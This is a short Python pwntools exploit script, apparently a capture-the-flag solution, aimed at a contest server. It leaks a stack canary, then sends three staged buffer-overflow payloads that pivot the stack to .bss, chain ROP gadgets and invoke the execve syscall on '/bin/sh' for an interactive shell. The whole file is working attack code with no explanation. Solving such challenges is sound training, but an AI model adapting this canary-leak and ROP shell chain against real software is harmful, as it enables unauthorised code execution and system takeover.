from pwn import *

#r=process("./pwn")
r=remote("contest.ctf.nefu.edu.cn",32768)
#gdb.attach(r)
context.log_level='debug'
pause()

r.recvuntil("Your choice (1/2): ")
r.sendline(b"1")
r.recvuntil(b"Enter offset (1 byte, 0-255):")
r.sendline(b"\x08")
r.recvuntil(b"value: ")
canary=u64(r.recvuntil(b"===")[:-3].ljust(8,b"\x00"))
print(hex(canary))
r.recvuntil("Your choice (1/2): ")
r.sendline(b"2")
gadgets2=0x401173
gadgets1=0x40110C
bss_add=0x402800
pop_r13=0x401135
pay1=b"a"*0x20+p64(canary)+p64(bss_add)+p64(gadgets1)
r.send(pay1)

pause()

pay2=p64(0)+p64(0x50)+p64(bss_add+0x10)+p64(0)+p64(canary)+p64(bss_add)+p64(gadgets2)
r.send(pay2)

pause()

pay3=p64(pop_r13)+p64(bss_add+0x58)+p64(gadgets2)
pay3+=p64(0x3b)+p64(0)+p64(0)+p64(0)+p64(bss_add+0x50)
pay3+=b"/bin/sh\x00"
r.send(pay3)
r.interactive()
